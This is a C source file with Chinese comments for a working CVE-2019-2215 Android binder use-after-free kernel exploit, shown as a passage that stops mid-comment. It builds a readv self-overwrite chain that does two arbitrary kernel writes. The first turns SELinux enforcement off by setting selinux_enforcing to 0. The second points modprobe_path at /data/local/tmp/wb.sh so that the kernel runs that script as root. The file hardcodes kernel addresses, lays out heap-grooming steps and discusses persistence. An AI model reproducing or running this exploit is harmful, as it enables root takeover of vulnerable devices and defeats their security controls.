// SPDX-License-Identifier: MIT  (CVE-2019-2215 利用代码，仅供自有设备的安全研究)
//
// 归属：触发原语（/dev/binder + BINDER_THREAD_EXIT + epoll_ctl ADD→DEL 制造 UAF、
//       sched_setaffinity 钉核）参考自公开 PoC github.com/DimitriFourny/cve-2019-2215
//       （上游为 Google Project Zero bug 1942 的复现器）；
//       readv 自覆写链与「一次链双写」为本工程自己的实现。
//
// probe26.c —— phase-2 root：readv 自覆写链 → 单链双写【参数化 + 可重跑】
//     selinux_enforcing ← 0    modprobe_path ← <g_payload>（默认 /data/local/tmp/wb.sh）
//
// 【与 probe25 的关系】
//   probe25.c / probe25 二进制（sha256 9fafd730…）**冻结不动**，维持"二进制级可复现"的归档属性。
//   本文件是它的参数化分支：利用引擎（readv 自覆写链 → 一次链双写两个静态地址）逐字节照搬，
//   只做「外部接口」层面的改造 —— CLI 参数、动态 payload 路径、前置/后置检查、
//   可重复执行（收尾回收子进程与 fd）、输出规范化。
//   因此 probe26 的**默认参数**与 probe25 是同一基线：21 字符路径 ⇒ 写入 24 字节 ⇒
//   期望 readv 返回 69708，与冻结链对账一致。
//
// 【CLI】probe26 [-p PATH] [-n N] [-L PATH] [-y] [-q] [-V] [-h]（详见 usage()）
//   退出码：0 = 链命中且 selinux 已 Permissive
//           2 = readv 返回值不匹配，或写后 enforce 仍为 1（先对账，勿触发）
//           1 = 前置检查失败 / 资源错误
//
// 【可重跑】每次运行自建 40 个常驻 kmalloc-512（freelist ballast）并在退出前 SIGKILL + waitpid
//   回收，同时关闭全部自有 fd —— 多次手动调用不会留下残骸。**不做任何 sleep 重试利用逻辑**：
//   多次执行 = 多次手动调用，每次调用仍受停机条件约束（reboot / dmesg bug|oops|slab ⇒ 停）。
//
// 【修订】
//   v1.1 —— 修日志双流覆盖：典型调用 `./probe26 ... > probe26.log 2>&1` 使 stdout 与 LOGF
//           指向同一文件，两个独立偏移会因 observer 子进程的额外输出而错位，把日志尾部
//           覆盖成重复块（v1.0 实测）。修法：observer 自身静音（只写 obs 日志）+
//           检测同 inode 时只写一次。**只改日志通道，利用链一行未动。**
//   v1.2 —— 修 v1.1 遗留的**文件头 185 字节 NUL 空洞**：v1.1 改成"检测同 inode 后只写一次"，
//           但 LOGF 仍是 fopen(g_log_path,"w")；而 shell 的 `> log` 已先 truncate 一次，
//           且 stderr 的前置检查输出已把共享 fd 的偏移推后，此时 fopen("w") 只截断不重置偏移
//           ⇒ 从旧偏移处开始落 NUL。实测设备侧文件开头 185 个 0x00。
//           修法：LOGF 改为 fopen(g_log_path,"a")（O_APPEND，永远写在真实末尾），
//           并在非同 inode 时显式 truncate(g_log_path,0) 清掉 shell 预截断的残留。
//           宿主 x86_64 自测复现不出该空洞（glibc 的 fopen("w") 会重置偏移），
//           **必须在设备（bionic）上验证**。同样只动日志通道，利用链一行未动。
//
// 【历史沿革】probe24 是 phase-2 的第一支，含 R1..R4 四轮
//     （R1 writev 泄漏 / R2 skb 占据 + MSG_PEEK / R3 任意写 / R4 任意读），
//   其中 **R3 的「readv 自覆写链 → 任意写」是本支唯一的基础**。
//   probe25 只保留这一条已实证的链，把 payload 从「单写」扩成「一次链双写」；
//   probe26 在其上做参数化。
//   本文件里仍留着 probe24 的两件基础设施（有意保留，避免改动已实证引擎）：
//     · build_iov_steal —— do_clear 清场时的 400B 常驻数组用；
//     · crit_run 的 mode 1/2 分支 —— 原样保留；
//   其余 R1/R2/R4 专用部件（analyze_leak / build_iov_spray / build_stream_readv /
//   wait_empty / iov_total_steal / drain_to（R1 泄漏回读）/ spray|skb 相关全局）已全部删除。
//
// ============================================================================
// 【本支的结构】只有 1 轮，一次运行走完：
//   X 出生（binder_thread）→ 交易（期望 BR_NOOP/BR_TRANSACTION_COMPLETE）→ epoll ADD
//   → THREAD_EXIT（free 掉 binder_thread，epoll 仍持有其 waitqueue ⇒ UAF）
//   → steal（readv 阻塞；其 kiov 数组 LIFO 抢到被 free 的那个槽 ⇒ 数组地址 = X）
//   → DEL(+1.5s)（epoll_ctl(DEL) 把 X+0x48 / X+0x50 / X+0x58 改写掉）
//   → 单次连续 write 全流 ⇒ 链推进 ⇒ 两次 __copy_to_user 落静态地址。
//
//   与外部的门控（本程序只做第 ① 步，不触发 modprobe）：
//     ① 跑本程序 ⇒ 看日志里的 readv 返回值是否 == EXPECT_RET（默认参数下即 69708）
//     ② 门控 `getenforce` 必须变 Permissive（= 对 selinux_enforcing 的写生效），否则停
//     ③ 过门控后才触发假 binfmt（首 4 字节非可打印）⇒ request_module("binfmt-ffff")
//        ⇒ 内核以 uid=0 执行 modprobe_path（= 我们的 wb.sh）
//
// ============================================================================
// 【readv 自覆写链的精确机制 —— 已用本内核编译产物反汇编逐条裁决】
//
//   DEL 走 epoll → ep_unregister_pollwait → remove_wait_queue(q=&X+0x48, wait=&pwq->wait)
//     spin_lock_irqsave(&q->lock)         → X+0x48 = 0x00010001 ⇒ iov[4].iov_len = 65537
//     list_del_init(&pwq->wait.task_list) → 写回 q->task_list ⇒ X+0x50 = X+0x58 = X+0x50
//   ⇒ 若 X 是 readv 的 kiov 数组，则 iov[4]={gB,65537}、iov[5]={X+0x50, X+0x50}（iov_len 巨大）。
//
//   ★ 0x00010001 的由来（实测两轮联立得出，不是照抄公开 exp 的常数）：
//       R2 对象 +0x48 初值 0x43434343 → DEL 后 0x43444344；R3 初值 0 → 0x00010001；
//       两者都恰好 +0x00010001 ⇒ 这是 ARM64 3.18 **ticket spinlock**：
//       spin_lock 令 next++（+0x10000）、spin_unlock 令 owner++（+0x10000），合计 +0x00010001。
//       ⇒ 只有初值为 0（fresh kiov 数组恒成立，因为 import_iovec 会把我们给的
//         iov[4].iov_len = 0 原样拷进内核数组）时才恰好得到 65537。
//
//   机制：copy_page_to_iter_iovec() **每轮实时重读 iov->iov_len**，skip 记在 i->iov_offset：
//     · seg5 目的地 = iov[5].iov_base = X+0x50；一次调用最多吃「一个 4096B pipe 缓冲块」
//     · 喂入的伪造块把这 224 字节落进 X+0x50..X+0x12F（**仍在我们自己 400B 数组内**）：
//         bytes[0..7]    → iov[5].base（本段自己的 base，已消费，无意义）
//         bytes[8..15]   → iov[5].iov_len := 224   ←★ 必须 == 本次拷贝的字节数
//         bytes[16..23]  → iov[6].base    := &selinux_enforcing
//         bytes[24..31]  → iov[6].len     := 4
//         bytes[32..39]  → iov[7].base    := &modprobe_path
//         bytes[40..47]  → iov[7].len     := 24
//         bytes[48..223] → iov[8..18]     := 全 0（零长段被瞬时跳过）
//     · 拷完 224B 后 skip == iov[5].iov_len（它刚被自己改成 224）⇒ **iov++ ⇒ 前进到 iov[6]**
//       ⇒ 后续 payload 依次 __copy_to_user 到 iov[6]/iov[7] 的目标 —— 任意写成立。
//
//   ★ 为什么 bytes[48..223] 必须置 0：双写比单写多出 iov[8..18] 这些「被顺带改写」的槽。
//     它们若残留垃圾，就不再是零长段，后续段会被重定向到随机内核地址 ⇒ 内核崩。
//     这是"一次链双写"相对"单写"必须补的一项。
//
//   ★ 两条由反汇编钉死的硬约束（决定喂入方式，详见下方 SEG0_LEN 预算注释）：
//     ① pipe_read 的 syscall-merging 早退（0x1b25e4 `cbnz x20, out`）⇒ **必须单次连续 write()**；
//     ② 读端块粒度 = 4096B（pipe_write 0x1b219c `cmp x0,#0x1000`）⇒ 靠 sum(iov[0..3]) 对齐，
//        使 seg5 的拷贝恰好 224 字节，否则会越过数组打进邻居 slab 对象。
//
//   __copy_to_user / __copy_from_user 内部**不再做 access_ok**（access_ok 只在
//   import_iovec/rw_copy_check_uvector 进口时按用户态值检查一次，那时 iov 还是干净的），
//   所以运行期把目的地/源改成内核地址是可行的 —— 这正是 P0 公开 exploit 的同一原理。
//   ★ 实测补充：__copy_to_user 的目标**不限于内核堆**，内核 .data/.bss 同样有效
//     （probe25 就是靠这一点写 selinux_enforcing 与 modprobe_path 的）。
//
//   【反方向 = 任意读，本支不使用】DEL 把 iov[5].iov_base 改成内核地址后，writev 的
//   seg5 会用 __copy_from_user 把内核内存读进 pipe ⇒ 即 probe24 R1 的泄漏原理。
//   probe25 不做任意读：root 路径只需对**静态地址**写，读没有边际价值。
//
// ============================================================================
// 【kmalloc-512 黑名单纪律】临界窗口内不得出现新的 kmalloc-512 分配：
//   binder fd / epfd / 全部 pipe / 全部 mmap / observer fork / 40 个清场子进程
//   全部在 crit 之前开好（见 main 的 ① 段）。
//   临界区内唯一允许的中间操作 = crit_run 里那一条共享页 store（*flag_p = 1）。
//
// ============================================================================
// 【停机条件】reboot / dmesg 出现 bug|oops|binder|slab 异常 ⇒ 立即停。
// 【已实测的三个坑（写进源码免得再踩）】
//   ① usermodehelper 的 PATH 为空 ⇒ 载荷脚本必须用绝对路径，否则 id/ls/grep 全 not found；
//   ② `adb shell "printf '\xff…'"` 多层引号会吞转义 ⇒ 首 4 字节变成可打印 ASCII
//      ⇒ 内核 search_binary_handler 在 printable() 处早退、根本不触发 request_module；
//   ③ Android 的 mksh 会主动丢弃 setuid ⇒ cp /system/bin/sh + chmod 4755 拿不到 setuid
//      root shell（持久化应依赖 modprobe_path 劫持本身，而非 sh_root）。
#define _GNU_SOURCE
#include <stdio.h>
#include <stdarg.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <signal.h>
#include <stdint.h>
#include <time.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <sys/epoll.h>
#include <sys/uio.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <sched.h>
#include <fcntl.h>
#include <limits.h>
#include <sys/stat.h>

#ifndef F_SETPIPE_SZ
#define F_SETPIPE_SZ 1031
#endif
#ifndef F_GETPIPE_SZ
#define F_GETPIPE_SZ 1032
#endif

#define MAXS    64
#define MAXIOV  64
#define MAXC    64
#define IOVCNT  25              /* 400B → kmalloc-512；>8 才走 kmalloc（≤8 用栈上 __iov） */
#define LEAKW   0x22000         /* R1 writev 泄漏路径 iov[5].iov_len */
#define L5      0x12000         /* R3/R4 readv 链 iov[5].iov_len（决定进口 count 预算） */

/* 日志路径改为运行期可变（-L），默认值见 D_LOG_PATH / D_OBS_PATH */
#define D_LOG_PATH "/data/local/tmp/probe26.log"
#define D_OBS_PATH "/data/local/tmp/probe26.log.obs"
#define D_PAYLOAD  "/data/local/tmp/wb.sh"
#define DEF_NCLEAR 40
#define PAYLOAD_MAX 200          /* 路径长度上限（内核 KMOD_PATH_LEN=256，留安全余量） */
#define PROBE26_VER "probe26 1.2"

/* ---------------- 运行期配置（由 CLI 填充；默认值与 probe25 的硬编码等价） ----------------
 * g_payload_len = align8(strlen(g_payload) + 1)：
 *   ① 必须把结尾 NUL 一起写进 modprobe_path（否则内核读到的路径可能粘连旧尾巴）；
 *   ② 向上对齐到 8 字节，是为了让默认 21 字符路径复现 probe25 冻结链里的 24 字节长度，
 *      从而使 EXPECT_RET 与已验证的 69708 完全一致（见文件头「字节账」）。
 *      若严格取 strlen+1 = 22，则 PAY_LEN=74、EXPECT_RET=69706，链本身仍成立，
 *      只是对账基线改变 —— 本实现选择对齐，保持与冻结链同一基线。 */
static char        g_log_path[PATH_MAX] = D_LOG_PATH;
static char        g_obs_path[PATH_MAX] = D_OBS_PATH;
static const char *g_payload            = D_PAYLOAD;
static size_t      g_payload_len        = 0;
static size_t      g_pay_len            = 0;
static size_t      g_expect_ret         = 0;
#define ALIGN8(x) ((((size_t)(x)) + 7u) & ~(size_t)7u)

#define FA      0x41u
#define FB      0x42u
#define FC      0x43u           /* skb payload 填充 */
#define SLABDIR "/sys/kernel/slab/kmalloc-512/"

/* ---- 静态地址（hist/静态作业_phase2_2026-10-06.md，nm + ELF 数据字节实证） ---- */
#define A_INIT_TASK        0xffffffc0013ede30UL
#define A_INIT_CRED        0xffffffc0013f6c68UL
#ifndef A_MODPROBE_PATH
#define A_MODPROBE_PATH    0xffffffc001e37ce0UL
#endif
#ifndef A_SELINUX_ENFORCING
#define A_SELINUX_ENFORCING 0xffffffc002283174UL
#endif
/* task_struct 偏移 */
#define T_STACK    0x08
#define T_TASKS    0x3D0
#define T_REAL_CRED 0x630
#define T_CRED     0x638
#define T_COMM     0x640
#define T_PID      0x490
/* cred 偏移 */
#define C_UID      0x04
#define C_EUID     0x14
#define C_CAP_PERM 0x30
#define C_CAP_EFF  0x38
#define C_USER     0x78
#define C_USER_NS  0x80
#define C_GROUPINFO 0x88

struct binder_write_read {
    uintptr_t write_size, write_consumed, write_buffer;
    uintptr_t read_size, read_consumed, read_buffer;
};
struct binder_transaction_data {
    union { uint32_t handle; uintptr_t cookie; } target;
    uintptr_t cookie;
    uint32_t code, flags;
    int32_t  sender_pid;
    uint32_t sender_euid;
    uintptr_t data_size, offsets_size;
    union { struct { uintptr_t buffer, offsets; } ptr; uint8_t buf[8]; } data;
};
struct binder_version { int32_t protocol_version; };

#define BINDER_WRITE_READ       0xC0306201u
#define BINDER_VERSION          0xC0046209u
#define BINDER_THREAD_EXIT      0x40046208u
#define BC_TRANSACTION          0x40406300u
#define BR_NOOP                 0x720cu
#define BR_TRANSACTION_COMPLETE 0x7206u

/* ---------------- 日志 ---------------- */
/* 说明：典型调用是 `./probe26 ... > probe26.log 2>&1`，此时 **stdout 与 LOGF 指向同一个文件**。
 * 若对两个独立的 FILE*（各自持有独立文件偏移）都写同样的字节，两条流的偏移会因子进程的
 * 额外输出而错位，最终把日志尾部覆盖成重复块（probe26 v1.0 实测踩到）。
 * 故：① observer 子进程把自己的 stdout 静音（它只该写 obs 日志）；
 *     ② 检测到 LOGF 与 stdout 同 inode 时只写一次。 */
static FILE *LOGF = NULL;
static int   g_quiet = 0;                    /* -q：抑制 stdout，仅留结果行 */
static int   g_force = 0;                    /* -y：跳过交互确认 */
static int   g_log_is_stdout = 0;            /* LOGF 与 stdout 是同一个文件 */
static unsigned long g_clear_pid[MAXC];      /* 清场子进程 pid 表（收尾要回收） */
static int   g_clear_n = 0;
static void log_samefile_probe(void) {
    struct stat a, b;
    if (!LOGF) return;
    if (fstat(fileno(stdout), &a) != 0) return;
    if (fstat(fileno(LOGF), &b) != 0) return;
    g_log_is_stdout = (a.st_dev == b.st_dev && a.st_ino == b.st_ino);
}
static void plog(const char *fmt, ...) {
    va_list ap;
    int wrote_stdout = 0;
    if (!g_quiet) {
        va_start(ap, fmt); vprintf(fmt, ap); va_end(ap);
        fflush(stdout);
        wrote_stdout = 1;
    }
    if (LOGF && !(g_log_is_stdout && wrote_stdout)) {
        va_start(ap, fmt); vfprintf(LOGF, fmt, ap); va_end(ap);
        fflush(LOGF); fsync(fileno(LOGF));
    }
}
static void bye(int sig) { (void)sig; plog("[!] alarm timeout\n"); _exit(9); }

/* ---------------- observer 共享页（沿用 probe22 P20.6-1） ---------------- */
struct obs_shared {
    volatile int           rnd;
    volatile int           step;
    volatile long          t0, t1, t2, t3, t4;
    volatile int           vret, iret, ierr, aerr, xret, bad;
    volatile unsigned long wcons, rcons;
    volatile unsigned int  rb0, rb1;
    volatile int           done;
};
static struct obs_shared *OBS = NULL;

static void observer_run(void) {
    cpu_set_t s; CPU_ZERO(&s); CPU_SET(5, &s);
    sched_setaffinity(0, sizeof(s), &s);
    g_quiet = 1;                    /* observer 只写 obs 日志，不碰父进程的 stdout */
    LOGF = fopen(g_obs_path, "a");
    signal(SIGALRM, bye);
    alarm(900);
    int lastr = -1, last = -1;
    for (;;) {
        __sync_synchronize();
        int r = OBS->rnd, st = OBS->step;
        if (r != lastr || st != last) {
            long t0 = OBS->t0, t1 = OBS->t1, t2 = OBS->t2, t3 = OBS->t3, t4 = OBS->t4;
            plog("[obs] r=%d step=%d ", r, st);
            if (st >= 1) plog("t0=%ld VERSION=%ldns(vret=%d) ", t0, t1 - t0, OBS->vret);
            if (st >= 2) plog("txn=%ldns(iret=%d ierr=%d wcons=%lu rcons=%lu buf=[%08x,%08x]) ",
                              t2 - t1, OBS->iret, OBS->ierr, OBS->wcons, OBS->rcons,
                              OBS->rb0, OBS->rb1);
            if (st >= 3) plog("ADD=%ldns(aerr=%d) ", t3 - t2, OBS->aerr);
            if (st >= 4) plog("EXIT=%ldns(xret=%d) 合计=%ldns(%.2f us) bad=%d",
                              t4 - t3, OBS->xret, t4 - t0, (double)(t4 - t0) / 1000.0, OBS->bad);
            plog("\n");
            lastr = r; last = st;
        }
        if (OBS->done) { plog("[obs] 父进程已结束，observer 退出\n"); _exit(0); }
        usleep(50);
    }
}

static inline long now_ns(void) {
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    return (long)ts.tv_sec * 1000000000L + (long)ts.tv_nsec;
}

/* ---------------- 全局资源（全部在 crit 之前开好） ---------------- */
static uint8_t *gA = NULL, *gB = NULL;      /* 0x20000000 / 0x20200000，1MB，填 0x41/0x42 */
static volatile int *flag_p = NULL;         /* 临界区唯一中间操作：一条共享页 store */
static int steal_pipe[5][2];                /* 本支只用 [1]；[2..4] 沿用 probe24 的编号 */
static int clearc_pipe[MAXC][2];            /* 清场用的 40 根 pipe */
static int syncd[2];                        /* DEL 子进程 → 主进程的信号 */
static uint8_t *DBUF = NULL;                /* 排空缓冲区（本支仅用于预置/落盘） */
#define DMAX (1024 * 1024)

static int   g_nclear = 40;                 /* 常驻 kmalloc-512 个数（freelist ballast） */

/* ---------------- iov 布局 ---------------- */
/* 本支只被 do_clear 用（清场子进程的 400B 常驻数组；写法沿用 probe24 R1，保持一致） */
static void build_iov_steal(struct iovec *iov, int n) {
    memset(iov, 0, sizeof(struct iovec) * n);
    iov[0].iov_base = gA; iov[0].iov_len = 0x1000;
    for (int i = 1; i < 4; i++) { iov[i].iov_base = gA; iov[i].iov_len = 8; }
    iov[4].iov_base = gB; iov[4].iov_len = 0;
    iov[5].iov_base = gA; iov[5].iov_len = LEAKW;
    for (int i = 6; i < n; i++) { iov[i].iov_base = gA; iov[i].iov_len = 8; }
}

/* ---- R3/R4 readv 链的对齐预算（由 pipe_read/pipe_write 反汇编反解，见文件头） ----
 *
 * 约束 1（syscall merging 早退）：pipe_read 在「pipe 空 && waiting_writers==0 && ret>0」时
 *   立即短读返回（0x1b25e4: cbnz x20, out）。⇒ 喂入必须**单次连续 write()**：
 *   写者只要还有待写数据，pipe 空时它必然阻塞在 pipe_wait（持 pipe mutex）⇒ waiting_writers==1
 *   ⇒ 读端不会早退。分相喂入（写完一相再写下一相）会被截断，已否决。
 *
 * 约束 2（块粒度）：读端每次 copy_page_to_iter 最多吞掉**一个 4096B pipe 缓冲块**
 *   （pipe_write: 1b219c `cmp x0,#0x1000`；chars = min(buf->len, total_len)）。
 *   ⇒ seg5（iov[5].iov_base 已被 DEL 改成 X+0x50、iov_len 巨大）一次拿走的字节数
 *     = 「含 seg5 起点的那个块」的余量。为了让这 224 字节**全部落回我们自己的 400B 数组**
 *     （X+0x50+224 = X+0x130 < X+0x18F，数组末尾），块余量必须 = 224。
 *
 * 约束 2 反解：seg5 起点 = sum(iov[0..3]) + 65537（seg4 的实测长度 0x00010001）。
 *   要求 (seg5起点 + 224) ≡ 0 (mod 4096) ⇒ sum(iov[0..3]) ≡ 4096−225 = 3871 (mod 4096)
 *   ⇒ 取 iov[0].iov_len = 3871、iov[1..3] = 0（合计 S = 3871）。
 *
 *   字节账（单次 write，流长 = 69632 + LEN）：
 *     [0,      3871)  0x41            → seg0（4063? 不：3871）
 *     [3871,  69408)  0x42            → seg4（65537 字节，3871+65537 = 69408）
 *     [69408, 69632)  224B 伪造块     → seg5：整块就是它的拷贝目标（X+0x50..X+0x12F）
 *     [69632, 69632+LEN) payload      → seg6：__copy_to_user(TARGET, payload, LEN)
 *   块边界：4096×17 = 69632 ⇒ 第 16 块 = [65536,69632) 恰好在伪造块末尾收尾 ⇒
 *     seg5 的拷贝 = 4096 − (69408−65536 = 3872) = 224 ✓；第 17 块 [69632,..) = payload ✓
 *
 *   伪造块内容（224 字节，落点 X+0x50 起）：
 *     bytes[0..7]   覆盖 iov[5].iov_base（本段自己的 base，已消费，无所谓）
 *     bytes[8..15]  = 224  → **iov[5].iov_len 改写成 224**（skip 满 224 即前进）
 *     bytes[16..23] = TARGET
 *     bytes[24..31] = LEN
 *     bytes[32..223]= 填充，落在 X+0x70..X+0x12F（iov[7]..iov[24] 区域）——全在我们自己数组内
 *
 *   段序推进：第 17 块到达时 skip==iov[5].iov_len==224 ⇒ copy=0 ⇒ goto next ⇒ iov++ ⇒ iov[6]
 *             ⇒ copy = min(块字节, iov[6].iov_len=LEN) ⇒ 写到 TARGET。
 *
 *   count（import 时算死）= 3871 + 0 + 0 + 0 + 0 + L5 + 19×8 = L5 + 4023
 *                           消耗 3871+65537+224 后余 L5−6309 ≫ LEN ✓（L5=0x12000→67419）
 */
#define SEG0_LEN   3871
#define FORGE_LEN  224
#define SEG4_LEN   65537
#define SEG5_OFF   ((size_t)SEG0_LEN + SEG4_LEN)          /* 69408 */
#define STREAM_HI  (SEG5_OFF + FORGE_LEN)                 /* 69632 = 4096×17，块边界 */
static void build_iov_readv(struct iovec *iov, int n) {      /* R3/R4: readv 链 */
    memset(iov, 0, sizeof(struct iovec) * n);
    iov[0].iov_base = gA; iov[0].iov_len = SEG0_LEN;
    for (int i = 1; i < 4; i++) { iov[i].iov_base = gA; iov[i].iov_len = 0; }
    iov[4].iov_base = gB; iov[4].iov_len = 0;                /* ← DEL 后变 65537 */
    iov[5].iov_base = gA; iov[5].iov_len = L5;               /* ← DEL 后变 {X+0x50, X+0x50} */
    for (int i = 6; i < n; i++) { iov[i].iov_base = gA; iov[i].iov_len = 8; }
}
static size_t iov_total_readv(int n) {
    return (size_t)SEG0_LEN + 0 + 0 + 0 + (size_t)L5 + (size_t)(n - 6) * 8;   /* = L5 + 4023 */
}
/* ---------------- slab 快照 ---------------- */
static long slab_read(const char *name, const char *tag) {
    char path[256]; snprintf(path, sizeof(path), "%s%s", SLABDIR, name);
    FILE *f = fopen(path, "r");
    if (!f) { plog("    [%s] %s 不可读 errno=%d(%s)\n", tag, name, errno, strerror(errno)); return -1; }
    char b[64]; long v = -1;
    if (fgets(b, sizeof(b), f)) v = atol(b);
    fclose(f);
    plog("    [%s] %s = %ld\n", tag, name, v);
    return v;
}
static void slab_snap(const char *tag) {
    plog("  --- slab 快照 %s ---\n", tag);
    slab_read("partial", tag);
    slab_read("objects", tag);
}

/* ---------------- 清场（衔接） ---------------- */

/* 清场：抽干 CPU4 的 kmalloc-512 freelist（msgsnd 不可用 ⇒ writev 常驻回退，同 probe20）
 * 与 probe25 的唯一差别：登记子进程 pid（收尾统一 SIGKILL + waitpid，保证可重跑不留残骸）。
 * 清场子进程在 crit 期间必须存活（它们持有的 400B 对象就是 freelist ballast），只在本进程退出前回收。 */
static int do_clear(int nclear) {
    plog("[clear] CONFIG_SYSVIPC=n ⇒ 走 writev 常驻回退\n");
    if (nclear > MAXC) nclear = MAXC;
    for (int i = 0; i < nclear; i++) {
        uint8_t *f = malloc(4096); memset(f, FA, 4096);
        ssize_t fw = write(clearc_pipe[i][1], f, 4096); (void)fw; free(f);
    }
    int n = 0;
    for (int i = 0; i < nclear; i++) {
        pid_t p = fork();
        if (p == 0) {
            alarm(900);
            struct iovec iov[MAXIOV]; build_iov_steal(iov, IOVCNT);
            writev(clearc_pipe[i][1], iov, IOVCNT);   /* 阻塞 ⇒ 400B 对象常驻 */
            _exit(0);
        }
        if (p > 0 && n < MAXC) g_clear_pid[n++] = (unsigned long)p;
    }
    g_clear_n = n;
    usleep(200000);
    plog("[clear] %d 个常驻 kmalloc-512（各 400B，blocking writev）\n", n);
    return n;
}

/* 收尾：回收清场子进程（否则多次运行后阻塞在 writev 的子进程会累积） */
static void reap_clear(void) {
    for (int i = 0; i < g_clear_n; i++) {
        if (g_clear_pid[i]) kill((pid_t)g_clear_pid[i], SIGKILL);
    }
    for (int i = 0; i < g_clear_n; i++) {
        if (g_clear_pid[i]) { int st; waitpid((pid_t)g_clear_pid[i], &st, 0); (void)st; }
    }
    if (g_clear_n > 0) plog("[clear] 已回收 %d 个清场子进程\n", g_clear_n);
    g_clear_n = 0;
}

/* ---------------- 临界区：VERSION → txn → ADD → EXIT → steal ---------------- */
struct crit_out {
    long c0, v1, c1, c2, c3;
    int  vret, iret, ierr, aerr, ac, r, bad;
    size_t wcons, rcons;
    uint32_t rb0, rb1;
    ssize_t sret; int serr;
};
static void crit_run(int fd, int epfd, struct iovec *iov, int iovcnt, struct crit_out *o,
                     uint8_t *rb, size_t rbsz, int mode, int sp[2], ssize_t *sret_out, int *serr_out) {
    memset(o, 0, sizeof(*o));
    int ac = 0, r = 0;
    size_t wcons = 0, rcons = 0; uint32_t rb0 = 0, rb1 = 0;

    static uint8_t wbuf[128];
    memset(wbuf, 0, sizeof(wbuf));
    *(uint32_t *)wbuf = BC_TRANSACTION;
    struct binder_transaction_data *tr = (struct binder_transaction_data *)(wbuf + 4);
    tr->target.handle = 0; tr->code = 0; tr->flags = 0;
    struct binder_write_read bwr; memset(&bwr, 0, sizeof(bwr));
    bwr.write_size = 68; bwr.write_buffer = (uintptr_t)wbuf;
    bwr.read_size  = 72; bwr.read_buffer  = (uintptr_t)rb;
    struct binder_version ver = {0};

    /* ------- 临界区 ------- */
    long c0 = now_ns();
    OBS->t0 = c0; __sync_synchronize(); OBS->step = 0;

    errno = 0; int vret = ioctl(fd, BINDER_VERSION, &ver);
    long v1 = now_ns();
    OBS->vret = vret; OBS->t1 = v1; __sync_synchronize(); OBS->step = 1;

    errno = 0; int iret = ioctl(fd, BINDER_WRITE_READ, &bwr); int ierr = errno;
    long c1 = now_ns();
    wcons = (size_t)bwr.write_consumed; rcons = (size_t)bwr.read_consumed;
    rb0 = *(uint32_t *)rb; rb1 = *(uint32_t *)(rb + 4);
    int bad = (iret != 0) | (wcons != 68) | (rcons != 8) | (rb0 != BR_NOOP) | (rb1 != BR_TRANSACTION_COMPLETE);
    OBS->iret = iret; OBS->ierr = ierr; OBS->wcons = wcons; OBS->rcons = rcons;
    OBS->rb0 = rb0; OBS->rb1 = rb1; OBS->bad = bad; OBS->t2 = c1;
    __sync_synchronize(); OBS->step = 2;

    errno = 0; ac = epoll_ctl(epfd, EPOLL_CTL_ADD, fd, &(struct epoll_event){ .events = EPOLLIN });
    int aerr = (ac < 0) ? errno : 0;
    long c2 = now_ns();
    if (ac < 0) bad |= 2;
    OBS->aerr = aerr; OBS->bad = bad; OBS->t3 = c2;
    __sync_synchronize(); OBS->step = 3;

    errno = 0; r = ioctl(fd, BINDER_THREAD_EXIT, 0);
    long c3 = now_ns();
    OBS->xret = r; OBS->t4 = c3; __sync_synchronize(); OBS->step = 4;

    *flag_p = 1;                      /* 唯一中间操作：一条共享页 store */

    ssize_t sret = 0; int serr = 0;
    if (mode == 1) {                  /* R1: steal = 阻塞 writev（full pipe） */
        errno = 0; sret = writev(sp[1], iov, iovcnt); serr = errno;
    } else if (mode == 2) {           /* R2: steal = sendmsg（AF_UNIX skb） */
        uint8_t pay[128]; memset(pay, FC, sizeof(pay));
        struct iovec iv = { pay, sizeof(pay) };
        struct msghdr mh; memset(&mh, 0, sizeof(mh));
        mh.msg_iov = &iv; mh.msg_iovlen = 1;
        errno = 0; sret = sendmsg(sp[0], &mh, 0); serr = errno;
    } else {                          /* R3/R4: steal = 阻塞 readv（empty pipe） */
        errno = 0; sret = readv(sp[0], iov, iovcnt); serr = errno;
    }
    OBS->step = 5;
    /* ------- 临界区结束 ------- */

    o->c0 = c0; o->v1 = v1; o->c1 = c1; o->c2 = c2; o->c3 = c3;
    o->vret = vret; o->iret = iret; o->ierr = ierr; o->aerr = aerr; o->ac = ac; o->r = r;
    o->bad = bad; o->wcons = wcons; o->rcons = rcons; o->rb0 = rb0; o->rb1 = rb1;
    o->sret = sret; o->serr = serr;
    if (sret_out) *sret_out = sret;
    if (serr_out) *serr_out = serr;
}

/* ---------------- 每轮收尾：非阻塞回收 ---------------- */
static void reap_nb(int ms) {
    for (int t = 0; t < ms / 10; t++) {
        int st, reaped = 0;
        while (waitpid(-1, &st, WNOHANG) > 0) reaped = 1;
        if (reaped) t = 0;
        usleep(10000);
    }
}

/* =========================================================================
 * 【payload 构造】单链双写 —— 本支的全部落地动作（probe26：路径运行期可变）
 *   TARGET-1 = &selinux_enforcing  (4B,  0x00000000)
 *   TARGET-2 = &modprobe_path      (g_payload_len B, g_payload + NUL 填充)
 *
 * 复用 probe24 R3 已实证的机制：DEL 把 iov[4].iov_len 写成 0x00010001、
 * 把 iov[5] 改成 {X+0x50, X+0x50}；喂入单次连续 write() 的 69632+g_pay_len 字节流，
 * 第 16 号 4096B 块末尾余 224B ⇒ seg5 恰好拷 224B 落回自己的数组（iov[5]..iov[18]），
 * 于是 iov[5].len 被改写成 224 == skip ⇒ 迭代器前进到 iov[6] ⇒ 后续 payload
 * 依次 __copy_to_user 到 iov[6]/iov[7] 的目标。
 *
 * 落点窗口（224B，落 X+0x50..X+0x12F）：
 *   [0..7]    iov[5].base  ← 0              （迭代器已本地前移，本字段无意义）
 *   [8..15]   iov[5].len   ← 224            （沿用 R3 的块边界数）
 *   [16..23]  iov[6].base  ← &selinux_enforcing
 *   [24..31]  iov[6].len   ← 4
 *   [32..39]  iov[7].base  ← &modprobe_path
 *   [40..47]  iov[7].len   ← g_payload_len  ★ 必须与下方 payload 实际字节数一致，
 *                                              不得残留 probe25 的硬编码 24
 *   [48..223] iov[8..18]   ← 全 0           （零长段被瞬时跳过；若不置 0，
 *                                            残留垃圾会把后续段重定向到随机内核地址
 *                                            —— 这是双写相对单写必须补的一项）
 *
 * 之后 pipe 里的 payload 依次喂：
 *   iov[6] 4B              → selinux_enforcing
 *   iov[7] g_payload_len B → modprobe_path（g_payload + 尾部 NUL 填充）
